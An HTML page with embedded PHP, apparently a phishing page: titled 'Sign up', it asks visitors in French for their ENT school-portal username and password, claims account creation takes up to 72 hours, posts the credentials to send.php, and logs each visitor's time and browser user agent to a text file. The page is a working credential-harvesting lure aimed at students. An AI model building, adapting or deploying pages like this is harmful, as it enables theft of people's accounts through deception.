<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" href="style.css">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/png" href="https://em-content.zobj.net/source/apple/354/butterfly_1f98b.png">
    <title>Sign up🔏</title>    
</head>
<body>
  <style>
    h2 {
      color: white;
      font-size: 20px;
      font-family: 'Segoe UI', sans-serif;
    }

    h3 {
      color: white;
      font-size: 10px;
      font-family: 'Segoe UI', sans-serif;
    }
  </style>
  <div class="icon">
    <img src="img/icon.png" class="imgicon" >
  </div>
  <div class="login-box">
    <h1>
      Sign in
    </h1>
    <h2>
      Utilise tes identifiants ENT
    </h2>
    <form method="post" action="send.php">
      <div class="user-box">
        <input type="text" name="username" required>
        <label for="username">Username</label>
      </div>
      <div class="user-box">
        <input type="password" name="password" required>
        <label for="password">Password</label>
        <h3>
          La création du compte prendra maximum 72 heures.
        </h3>
      </div>
      <center>
        <button class="bouttonlogin" type="submit" name="submit">SEND</button>
      </center>
    </form>
  </div>

  <?php
    $heure = date("Y-m-d H:i:s");

    // Récupérer le modèle de l'appareil et le navigateur de l'utilisateur
    $user_agent = $_SERVER['HTTP_USER_AGENT'];

    // Créer une chaîne de données à écrire dans le fichier
    $log_data = "Heure : $heure\n";
    $log_data .= "Modèle de l'appareil et navigateur : $user_agent\n";

    // Spécifiez le chemin du fichier dans lequel vous souhaitez écrire les données
    $log_file = "/path/to/log/signup.txt"; // Assurez-vous d'ajouter l'extension .txt

    // Ouvrir le fichier en mode écriture (ou le créer s'il n'existe pas)
    $file_handle = fopen($log_file, "a");

    // Écrire les données dans le fichier
    if ($file_handle) {
      fwrite($file_handle, $log_data);
      fclose($file_handle);
    } else {
      echo " ";
    }
  ?>

</body>
</html>
